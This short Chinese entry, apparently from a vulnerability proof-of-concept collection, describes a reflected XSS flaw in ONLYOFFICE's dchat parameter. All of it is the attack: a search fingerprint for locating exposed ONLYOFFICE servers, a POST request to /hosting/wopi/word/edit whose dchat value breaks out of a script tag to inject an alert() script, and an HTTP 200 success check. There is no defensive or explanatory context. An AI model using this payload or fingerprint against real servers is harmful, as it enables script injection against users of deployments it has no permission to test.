# onlyoffice-dchat存在反射xss漏洞

onlyoffice-dchat ｜ XSS ｜ —
- **指纹**：`app="ONLYOFFICE"`
- **请求**：`POST /hosting/wopi/word/edit?dchat=asdasd</script><script>alert('XSS')</script> HTTP/1.1`
- **响应特征**：200